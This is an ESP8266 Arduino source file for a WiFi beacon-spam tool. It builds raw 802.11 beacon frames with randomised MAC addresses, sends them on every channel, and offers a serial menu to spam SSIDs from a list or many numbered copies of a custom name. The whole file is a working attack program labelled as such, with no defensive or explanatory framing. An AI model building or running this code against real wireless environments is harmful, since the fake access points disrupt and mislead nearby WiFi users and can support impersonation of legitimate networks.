
#include <ESP8266WiFi.h>
#include "defs.h"

using namespace defs;

extern "C" {
  #include "user_interface.h"
}
int arrayindex;
int packetsSent;
unsigned int lastTime;
bool attacking;
uint8_t menuChoice; // default is default attack
String customSSID; // custom SSID for the user to enter
uint8_t numSSID; // current number of fake SSIDS showing 
uint8_t numSSIDLimit; // how many fake SSIDS to show to create based on custom input

void setup() {
    delay(500);
    wifi_set_opmode(STATION_MODE);
    wifi_promiscuous_enable(1); 

    arrayindex = 0;
    packetsSent = 0;
    lastTime = millis();
    attacking = false;
    menuChoice = 1;
    numSSIDLimit = 0;
    numSSID = 0;

    Serial.begin(115200);
    Serial.println("\nBeacon Spam Menu:\n");
    Serial.println("1: Default spam with ssids from file.");
    Serial.println("2: Custom SSID to spam.");
}

void sendBeacon(const char* ssid){
    int ssidSize = strlen(ssid);
    int packetSize = 38 + ssidSize + sizeof(postSSID);

    beaconPacket[37] = ssidSize;

    //copying SSID into packet an post SSID
    memcpy(&beaconPacket[38], ssid, ssidSize);
    memcpy(&beaconPacket[38 + ssidSize], postSSID, sizeof(postSSID));

    // Randomize SRC MAC
    for(int k=0; k< 6; k++){
        beaconPacket[10 + k] = beaconPacket[16 + k] = random(256);
    }

    //looping through every wifi channel
    for(int i=0; i < NUM_CHANNELS ; i++){
        wifi_set_channel(channels[i]);
        beaconPacket[50 + ssidSize] = channels[i];

        //send it out 3 times to be sure
        for(int i=0; i<3; i++){
            packetsSent += wifi_send_pkt_freedom(beaconPacket, packetSize, 0) == 0;  
            delay(1);
        }
        
    }
    
}

void defaultAttack(){
    sendBeacon(ssids[arrayindex]);
    arrayindex++;
    if(arrayindex >= NUM_SSIDS){arrayindex =0;}
}

void customAttack(){
    String newSSID = customSSID + " ";
    newSSID += numSSID;
    sendBeacon(&newSSID[0]);
    
    if(++numSSID >= numSSIDLimit){numSSID =0;}
}

void loop() {
    
    if(!attacking){
        attacking = true;

        while (!Serial.available()){}
        menuChoice = Serial.parseInt();

        if(menuChoice == 2){
            Serial.print("Enter Custom SSID to spam: ");
            while (!Serial.available()){}
            customSSID = Serial.readStringUntil('\n');

            Serial.print("# of networks spammed: ");
            while (!Serial.available()){}
            numSSIDLimit = Serial.parseInt();
        }
    }

    switch(menuChoice){
        case 1:
            defaultAttack(); break;
        case 2:
            customAttack(); break;
        default:
            Serial.println("Invalid Input"); 
            break;
    }

    if (millis() - lastTime > 2000){
        Serial.printf("Packets Sent: %d\n", packetsSent);
        lastTime = millis();
    }
}